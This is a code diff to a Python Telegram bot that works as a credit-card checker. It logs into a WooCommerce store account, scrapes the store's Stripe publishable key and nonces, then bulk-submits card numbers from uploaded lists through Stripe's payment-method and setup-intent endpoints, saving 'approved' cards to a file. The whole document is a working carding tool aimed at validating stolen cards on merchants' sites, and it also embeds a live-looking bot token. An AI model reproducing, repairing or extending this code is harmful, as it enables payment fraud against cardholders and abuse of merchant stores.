@@ -2,28 +2,24 @@ import logging
 import requests
 import re
 import time
-from io import BytesIO
+import threading
 from bs4 import BeautifulSoup
 from telegram import Update
-from telegram.ext import (
-    ApplicationBuilder, CommandHandler, MessageHandler,
-    ContextTypes, filters
-)
+from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
+from io import BytesIO
 
 BOT_TOKEN = "7615802418:AAFmsHTQP7_2iNEve7-aa6A6LNA4V2GfuDs"
+
 logging.basicConfig(level=logging.INFO)
 user_data = {}
+lock = threading.Lock()
 
-HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-    "Accept-Language": "en-US,en;q=0.9",
-    "Connection": "keep-alive",
-}
-
-def parse_card(card):
-    match = re.match(r'(\d{12,16})[|:](\d{2})[|:/](\d{2,4})[|:](\d{3,4})', card)
-    return match.groups() if match else None
+def get_headers():
+    return {
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "accept": "text/html,application/xhtml+xml",
+        "accept-language": "en-US,en;q=0.9",
+    }
 
 def detect_stripe_type(html):
     if "setup_intent" in html:
@@ -36,14 +32,19 @@ def detect_stripe_type(html):
         return "token"
     return "unknown"
 
-def try_login(session, login_url, email, password):
-    r = session.get(login_url, headers=HEADERS)
+def extract_pk(html):
+    match = re.search(r'pk_live_[a-zA-Z0-9]{10,}', html)
+    return match.group(0) if match else None
+
+def try_login(site, email, password, session):
+    login_url = f"https://{site}/my-account/"
+    r = session.get(login_url, headers=get_headers())
     soup = BeautifulSoup(r.text, 'html.parser')
     nonce = soup.find("input", {"name": "woocommerce-login-nonce"})
     referer = soup.find("input", {"name": "_wp_http_referer"})
 
     if not nonce:
-        return False, "Login page invalid."
+        return False, "Login page error."
 
     payload = {
         'username': email,
@@ -53,159 +54,150 @@ def try_login(session, login_url, email, password):
         'login': 'Log in'
     }
 
-    r = session.post(login_url, data=payload, headers=HEADERS)
+    r = session.post(login_url, data=payload, headers=get_headers())
     return ("customer-logout" in r.text), r.text
 
 async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    if len(context.args) < 2 or '|' not in context.args[0]:
-        await update.message.reply_text("Usage:\n`/addsitelogin site|email|pass <add_payment_link>`", parse_mode="Markdown")
+    args = context.args
+    if not args or len(args) < 1 or '|' not in args[0]:
+        await update.message.reply_text("Usage: /addsitelogin site|email|password")
         return
 
-    creds, add_url = context.args[0], context.args[1]
-    try:
-        site, email, password = creds.split("|")
-        login_url = f"https://{site}/my-account/"
-        session = requests.Session()
+    site, email, password = args[0].split("|")
+    session = requests.Session()
 
-        ok, response = try_login(session, login_url, email, password)
-        if not ok:
-            await update.message.reply_text("Login failed.")
-            return
+    success, resp_html = try_login(site, email, password, session)
+    if not success:
+        await update.message.reply_text("Login failed.")
+        return
 
-        r = session.get(add_url, headers=HEADERS)
-        stripe_type = detect_stripe_type(r.text)
-        if stripe_type == "unknown":
-            await update.message.reply_text("Could not detect Stripe method.")
-            return
-
+    with lock:
         user_data[user_id] = {
             "site": site,
             "email": email,
             "password": password,
-            "add_url": add_url,
-            "stripe_type": stripe_type
+            "session": session,
         }
 
-        await update.message.reply_text(
-            f"Login saved for {site}.\nStripe Method: `{stripe_type}`",
-            parse_mode="Markdown"
-        )
-    except Exception as e:
-        await update.message.reply_text(f"Error: {e}")
+    await update.message.reply_text("Login successful! Now send the Add Payment Method URL.")
 
-def extract_nonce(html):
-    match = re.search(r'"createAndConfirmSetupIntentNonce":"(\w+)"', html)
-    return match.group(1) if match else None
+async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in user_data:
+        await update.message.reply_text("Please login first using /addsitelogin")
+        return
 
-def process_card(card, info):
+    url = update.message.text
+    session = user_data[user_id]["session"]
+    r = session.get(url, headers=get_headers())
+
+    pk_live = extract_pk(r.text)
+    stripe_type = detect_stripe_type(r.text)
+
+    if not pk_live or stripe_type == "unknown":
+        await update.message.reply_text("Failed to detect Stripe configuration.")
+        return
+
+    user_data[user_id]["check_url"] = url
+    user_data[user_id]["pk"] = pk_live
+    user_data[user_id]["stripe_type"] = stripe_type
+
+    await update.message.reply_text(f"Stripe key: `{pk_live}`\nType: `{stripe_type}`", parse_mode="Markdown")
+
+def parse_card(card):
+    match = re.match(r'(\d{13,16})[|:](\d{2})[|:/](\d{2,4})[|:](\d{3,4})', card)
+    return match.groups() if match else None
+
+def check_card(card, data):
     try:
-        parsed = parse_card(card)
-        if not parsed:
-            return f"{card} -> Invalid format ❌"
+        cc, mm, yy, cvv = parse_card(card)
+        if len(yy) == 2:
+            yy = "20" + yy
 
-        cc, mm, yy, cvv = parsed
-        session = requests.Session()
-        session.headers.update(HEADERS)
+        session = data["session"]
+        site = data["site"]
+        pk = data["pk"]
+        stripe_type = data["stripe_type"]
+        check_url = data["check_url"]
 
-        login_url = f"https://{info['site']}/my-account/"
-        ok, _ = try_login(session, login_url, info['email'], info['password'])
-        if not ok:
-            return f"{card} -> Login failed ❌"
+        r = session.get(check_url, headers=get_headers())
+        nonce_match = re.search(r'"(\w{10,})"', r.text)
+        ajax_nonce = nonce_match.group(1) if nonce_match else None
 
-        r = session.get(info['add_url'], headers=HEADERS)
-        nonce = extract_nonce(r.text)
-        if not nonce:
-            return f"{card} -> Nonce not found ❌"
-
-        pubkey = re.search(r'"key":"(pk_live_[\w]+)"', r.text)
-        if not pubkey:
-            return f"{card} -> Public key not found ❌"
-
-        stripe_key = pubkey.group(1)
-
-        resp = requests.post(
+        r = requests.post(
             "https://api.stripe.com/v1/payment_methods",
             headers={
-                "Authorization": f"Bearer {stripe_key}"
+                "Authorization": f"Bearer {pk}"
             },
             data={
                 "type": "card",
                 "card[number]": cc,
                 "card[exp_month]": mm,
                 "card[exp_year]": yy,
-                "card[cvc]": cvv
+                "card[cvc]": cvv,
             }
         )
-        stripe_json = resp.json()
-        if "error" in stripe_json:
-            return f"{card} -> Declined ❌ {stripe_json['error']['message']}"
+        stripe_resp = r.json()
+        if 'error' in stripe_resp:
+            return f"{card} -> Declined ❌ ({stripe_resp['error']['message']})"
 
-        pm_id = stripe_json["id"]
+        pm_id = stripe_resp['id']
+
         payload = {
-            "action": "create_and_confirm_setup_intent",
-            "wc-stripe-payment-method": pm_id,
-            "wc-stripe-payment-type": "card",
-            "_ajax_nonce": nonce
+            'action': 'create_and_confirm_setup_intent',
+            'wc-stripe-payment-method': pm_id,
+            'wc-stripe-payment-type': 'card',
+            '_ajax_nonce': ajax_nonce
         }
 
-        confirm = session.post(info['add_url'].replace("/add-payment-method/", "/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"),
-                               data=payload, headers={"X-Requested-With": "XMLHttpRequest"})
-        result = confirm.json()
+        ajax_url = f"https://{site}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
+        final = session.post(ajax_url, data=payload, headers={"X-Requested-With": "XMLHttpRequest"})
 
-        if result.get("success") and result.get("data", {}).get("status") == "succeeded":
+        json_resp = final.json()
+        if json_resp.get("success") and json_resp.get("data", {}).get("status") == "succeeded":
             with open("approved.txt", "a") as f:
                 f.write(card + "\n")
             return f"{card} -> Approved ✅"
-        return f"{card} -> Declined ❌ {result.get('data', {}).get('message', '')}"
+        return f"{card} -> Declined ❌"
     except Exception as e:
-        return f"{card} -> Error ⚠️ {str(e)}"
-
-async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in user_data:
-        await update.message.reply_text("Use /addsitelogin first.")
-        return
-    if not context.args:
-        await update.message.reply_text("Usage: /chk cc|mm|yy|cvv")
-        return
-    card = context.args[0]
-    result = process_card(card, user_data[user_id])
-    await update.message.reply_text(result)
+        return f"{card} -> Error: {e}"
 
 async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in user_data:
-        await update.message.reply_text("Use /addsitelogin first.")
+        await update.message.reply_text("Please use /addsitelogin first.")
         return
 
     file = await update.message.document.get_file()
-    lines = (await file.download_as_bytes()).decode().splitlines()
+    content = await file.download_as_bytes()
+    lines = content.decode().splitlines()
 
-    stats = {"total": 0, "approved": 0, "declined": 0, "error": 0}
-    msg = await update.message.reply_text("Starting check...")
+    stats = {"total": 0, "approved": 0, "declined": 0, "errors": 0}
+    msg = await update.message.reply_text("Starting...")
 
     for card in lines:
-        res = process_card(card, user_data[user_id])
         stats["total"] += 1
-        if "Approved" in res:
+        result = check_card(card, user_data[user_id])
+        if "Approved" in result:
             stats["approved"] += 1
-        elif "Declined" in res:
+        elif "Declined" in result:
             stats["declined"] += 1
         else:
-            stats["error"] += 1
+            stats["errors"] += 1
 
         await msg.edit_text(
-            f"✅ {stats['approved']} | ❌ {stats['declined']} | ⚠️ {stats['error']} | Total: {stats['total']}"
+            f"Total: {stats['total']} | ✅ {stats['approved']} | ❌ {stats['declined']} | ⚠️ {stats['errors']}"
         )
 
-    await update.message.reply_document(document=BytesIO(open("approved.txt", "rb").read()), filename="approved.txt")
+    with open("approved.txt", "rb") as f:
+        await update.message.reply_document(document=BytesIO(f.read()), filename="approved.txt")
 
 def main():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("addsitelogin", addsitelogin))
-    app.add_handler(CommandHandler("chk", chk))
-    app.add_handler(MessageHandler(filters.Document.MIME_TYPE("text/plain"), mchk))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_url))
+    app.add_handler(MessageHandler(filters.Document.TEXT, mchk))
     app.run_polling()
 
 if __name__ == "__main__":
